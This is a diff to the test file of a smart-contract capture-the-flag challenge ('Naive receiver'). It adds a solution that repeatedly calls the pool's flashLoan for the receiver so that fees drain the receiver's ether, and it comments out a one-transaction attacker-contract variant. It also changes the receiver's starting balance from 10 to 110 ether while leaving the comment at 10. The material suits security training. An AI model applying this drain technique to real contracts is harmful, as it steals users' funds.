@@ -9,7 +9,7 @@ describe('[Challenge] Naive receiver', function () {
     const ETHER_IN_POOL = 1000n * 10n ** 18n;
 
     // Receiver has 10 ETH in balance
-    const ETHER_IN_RECEIVER = 10n * 10n ** 18n;
+    const ETHER_IN_RECEIVER = 110n * 10n ** 18n;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -38,6 +38,17 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const ETH = await pool.ETH();
+
+        /* Solution 1: for loop */
+        let receiverBalance = ETHER_IN_RECEIVER / 10n ** 18n
+        for (let i = 0; i < receiverBalance; i++) {
+            await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
+        }
+
+        /* Solution 2: one transaction */
+        // const NaiveAttackerFactory = await ethers.getContractFactory("NaiveAttacker", player);
+        // await (await NaiveAttackerFactory.deploy(pool.address)).attack(receiver.address, ETH, 0, "0x");
     });
 
     after(async function () {
